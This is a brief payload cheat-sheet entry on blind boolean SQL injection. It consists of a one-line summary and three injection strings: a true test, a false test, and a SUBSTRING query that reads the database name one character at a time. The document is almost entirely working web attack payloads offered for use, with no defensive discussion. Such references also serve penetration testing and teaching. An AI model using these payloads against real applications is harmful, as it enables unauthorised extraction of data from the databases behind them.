# Blind Boolean SQL Injection

## Summary
Infer data via true/false conditions.

## Payloads
```sql
' AND 1=1-- - (true)
' AND 1=2-- - (false)
' AND SUBSTRING((SELECT database()),1,1)='m'-- -
```
